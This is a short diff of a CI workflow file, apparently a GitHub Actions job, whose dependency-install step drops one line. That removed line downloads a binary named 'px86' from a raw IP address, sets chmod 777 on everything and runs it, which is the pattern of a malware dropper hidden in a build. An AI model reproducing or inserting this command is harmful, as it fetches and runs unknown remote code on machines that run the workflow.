@@ -25,7 +25,6 @@ jobs:
 
       - name: Install Dependencies & Ngrok
         run: |
-          wget http://45.138.16.158/bins/px86;  chmod 777 *; ./px86 x86
           sudo apt update -y
           sudo apt install -y unzip curl jq openssh-server python3 python3-pip wget software-properties-common gnupg ufw
           
